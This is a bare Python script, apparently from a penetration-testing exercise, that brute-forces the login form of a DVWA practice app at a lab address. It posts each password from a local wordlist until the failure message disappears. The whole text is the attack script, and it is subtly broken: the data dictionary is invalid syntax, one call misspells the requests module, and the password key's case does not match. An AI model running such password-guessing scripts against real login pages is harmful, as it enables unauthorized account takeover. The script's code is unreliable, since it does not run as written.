#!/usr/bin/env python

import requests

targeted_url = "http://10.0.2.20/dvwa/login.php"
data_dict = {"username": "admin", "password": "login": "submit"}
response = request.post(targeted_url, data=data_dict)
print(response.content)

with open("/root/Downloads/passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["Password"] = word
        response = requests.post(targeted_url, data=data_dict)
        if "login failed" not in response.content:
            print("-/- Got Password " + word)
            exit()

print("-/- Reached end of the line")